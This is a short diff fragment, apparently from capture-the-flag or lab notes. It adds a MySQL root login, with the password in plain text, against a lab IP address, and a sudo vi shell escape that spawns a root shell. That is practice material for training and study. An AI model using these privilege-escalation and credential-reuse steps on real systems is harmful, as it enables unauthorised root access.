@@ -1,9 +1,9 @@
 ```
-
+mysql -u root -pfMVWh7bDHpgZkyfqQXreTjU9 -h 10.129.229.138
 ```
 
 ```
-
+sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
 ```
 
 ```
